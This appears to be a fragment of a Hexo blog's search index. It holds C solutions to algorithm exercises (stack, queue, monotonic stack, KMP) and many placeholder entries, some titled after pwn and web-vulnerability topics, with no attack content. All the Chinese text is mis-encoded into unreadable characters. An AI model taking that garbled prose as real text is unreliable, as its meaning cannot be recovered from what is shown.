class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Acwing 828æ¨¡æ‹Ÿæ ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">15</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty()) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å››ã€é˜Ÿåˆ—">å››ã€é˜Ÿåˆ—</h2><p>ç‰¹ç‚¹ï¼šå…ˆè¿›åå‡º<br>æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 829æ¨¡æ‹Ÿé˜Ÿåˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;=n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, x);</span></span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äº”ã€å•è°ƒæ ˆ">äº”ã€å•è°ƒæ ˆ</h2><p>acwing 830å•è°ƒæ ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">        <span class="keyword">while</span>(top &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">stack</span>[top] &gt;= e) top--;</span><br><span class="line">        <span class="keyword">if</span>(top &lt;= <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">stack</span>[top]);</span><br><span class="line">        top++;</span><br><span class="line">        <span class="built_in">stack</span>[top] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å…­ã€å•è°ƒé˜Ÿåˆ—">å…­ã€å•è°ƒé˜Ÿåˆ—</h2><h2 id="ä¸ƒã€KMP">ä¸ƒã€KMP</h2><p>acwing 831 KMPå­—ç¬¦ä¸²</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 1000010</span></span><br><span class="line"><span class="type">char</span> p[N], s[M];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(p[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(s[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            j = ne[j];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i - n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandasä½¿ç”¨</title>
      <link href="/2022/10/pandas/"/>
      <url>/2022/10/pandas/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data analysis </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpyä½¿ç”¨</title>
      <link href="/2022/10/numpy/"/>
      <url>/2022/10/numpy/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> numpy </tag>
            
            <tag> data analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sort</title>
      <link href="/2022/10/sort/"/>
      <url>/2022/10/sort/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub</title>
      <link href="/2022/10/vulhub/"/>
      <url>/2022/10/vulhub/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crypto_1</title>
      <link href="/2022/10/crypto-1/"/>
      <url>/2022/10/crypto-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android_develop_1</title>
      <link href="/2022/10/android-develop-1/"/>
      <url>/2022/10/android-develop-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_1</title>
      <link href="/2022/10/flask-1/"/>
      <url>/2022/10/flask-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django_1</title>
      <link href="/2022/10/django-1/"/>
      <url>/2022/10/django-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React_1</title>
      <link href="/2022/10/react-1/"/>
      <url>/2022/10/react-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> React </tag>
            
            <tag> frontend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA_1</title>
      <link href="/2022/10/DVWA-1/"/>
      <url>/2022/10/DVWA-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web vuln </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾ç®€ä»‹</title>
      <link href="/2022/10/blockchain/"/>
      <url>/2022/10/blockchain/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.824_1</title>
      <link href="/2022/10/MIT6-824-1/"/>
      <url>/2022/10/MIT6-824-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.S081å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/10/MIT6-S081-1/"/>
      <url>/2022/10/MIT6-S081-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golangå­¦ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/10/golang1/"/>
      <url>/2022/10/golang1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNN</title>
      <link href="/2022/10/cnn/"/>
      <url>/2022/10/cnn/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> Neural Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Neural Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSTM</title>
      <link href="/2022/10/lstm/"/>
      <url>/2022/10/lstm/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> Neural Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Neural Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semesterå­¦ä¹ ï¼ˆäºŒï¼‰</title>
      <link href="/2022/10/missing-semester-2/"/>
      <url>/2022/10/missing-semester-2/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€»è¾‘å›å½’åˆ†æ</title>
      <link href="/2022/10/logistic-regression/"/>
      <url>/2022/10/logistic-regression/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ ï¼šçº¿æ€§å›å½’</title>
      <link href="/2022/10/linear-regression/"/>
      <url>/2022/10/linear-regression/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semesterå­¦ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/10/missing-semester-1/"/>
      <url>/2022/10/missing-semester-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshåˆ†æ</title>
      <link href="/2022/10/ssh-analysis/"/>
      <url>/2022/10/ssh-analysis/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> network-security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPsecåˆ†æ</title>
      <link href="/2022/10/IPsec-analysis/"/>
      <url>/2022/10/IPsec-analysis/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> network-sercurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network-sercurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ptmallocæºç åˆ†æ</title>
      <link href="/2022/10/ptmalloc-analysis/"/>
      <url>/2022/10/ptmalloc-analysis/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heapå­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/10/how2heap1/"/>
      <url>/2022/10/how2heap1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TODO_list</title>
      <link href="/2022/10/TODO-list/"/>
      <url>/2022/10/TODO-list/</url>
      
        <content type="html"><![CDATA[<p>è®¿é—®é€Ÿåº¦ä¸çŸ¥é“å’‹æ ·ï¼Œå¯èƒ½è€ƒè™‘æŒ‚ä¸ªCDN<br>å¤§æ¦‚ä¼šå†è¡¥å……</p><h2 id="å¡«å‘">å¡«å‘</h2><ul><li>å¯„å™¨å­¦ä¹ ï¼Œæ·±åº¦å­¦ä¹ ï¼Œç¥ç»ç½‘ç»œ</li><li>pwnæœªè¡¥å®ŒçŸ¥è¯†</li><li>å¤§æ•°æ®å®éªŒï¼ˆä¸ºä»€ä¹ˆæ²¡æœ‰ç½‘å®‰å®éªŒå’Œè½¯å®‰å®éªŒï¼Œå› ä¸ºå®åœ¨æ²¡æœ‰å«é‡‘é‡ï¼Œæ²¡æ´»äº†å¯èƒ½ä¼šæ”¾ä¸Šå»ï¼‰ã€é˜…è¯»</li><li>how2heapå­¦ä¹ </li><li>csapp</li><li>ç®—æ³•ä¸æ•°æ®ç»“æ„</li><li>è¯»ä¹¦ç¬”è®°</li><li>æ¡†æ¶å­¦ä¹ </li><li>moectfç­‰wpï¼ˆæ–°ç”Ÿèµ›è¢«æ–°ç”Ÿæ‰“çˆ†ï¼Œæ‚²ï¼‰</li></ul><h2 id="å¼€æ–°å‘">å¼€æ–°å‘</h2><ul><li>åŸºäºLSTMçš„æ—¥å¿—åˆ†æï¼ˆè®ºæ–‡å¤ªæŠ½è±¡äº†ï¼‰</li><li>æ“ä½œç³»ç»Ÿå†…æ ¸å®éªŒ</li><li>å­¦ä¹ è¿‡ç¨‹ä¸­çš„åšçš„é¡¹ç›®</li><li>å¤§äºŒå®éªŒä»£ç é‡æ„ï¼ˆå±å±±é‡æ„ï¼Œæ‚²ï¼‰</li><li>CVEåˆ†æ</li><li>å„ç§è¯¾çš„lab</li><li>missing-semester</li><li>åŒºå—é“¾</li></ul><h2 id="ä¸èƒ½å†å†™çš„ä¸œè¥¿">ä¸èƒ½å†å†™çš„ä¸œè¥¿</h2><ul><li>æŠ½è±¡æ–‡ï¼ˆå¤ªæŠ½è±¡äº†å®¹æ˜“æŠŠåˆ«äººå“åˆ°ï¼‰</li></ul>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
      <link href="/2022/07/Format-String/"/>
      <url>/2022/07/Format-String/</url>
      
        <content type="html"><![CDATA[<p>æŠŠhexoçš„post_assert_folderæ‰“å¼€äº†ï¼Œä¸‹æ¬¡ä¸€å®šå¥½å¥½ä¼ å›¾ğŸ˜­ğŸ˜­ğŸ˜­<br>ä¸€èˆ¬æ¥è¯´ç¬¬ä¸€æ¬¡åŠ è½½æ¯”è¾ƒæ…¢ï¼Œåç»­ä¼šå¥½å¾ˆå¤šã€‚ï¼ˆæ„Ÿè°¢ç¼“å­˜æœºåˆ¶ï¼‰<br>åç»­å¯èƒ½æ•´ä¸ªå›¾åºŠï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu18åŠä»¥ä¸Šå †æ ˆå¹³è¡¡çš„é—®é¢˜</title>
      <link href="/2022/07/some-problems-about-movaps/"/>
      <url>/2022/07/some-problems-about-movaps/</url>
      
        <content type="html"><![CDATA[<p>åœ¨åšpwné¢˜æ—¶å¸¸å¸¸é‡åˆ°äº†æ˜æ˜å¡«å……æ•°æ®é•¿åº¦å’Œå‡½æ•°åœ°å€å¡«å†™çš„éƒ½æ˜¯å¯¹çš„ï¼Œå´æ€»æ˜¯æ‰“ä¸è¿›å»çš„æƒ…å†µã€‚</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
            <tag> amd64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€é“¾æ¥è¿‡ç¨‹</title>
      <link href="/2022/07/dynamic-linking/"/>
      <url>/2022/07/dynamic-linking/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
            <tag> ç¼–è¯‘åŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆæº¢å‡ºåŸç†</title>
      <link href="/2022/07/stack-overflow/"/>
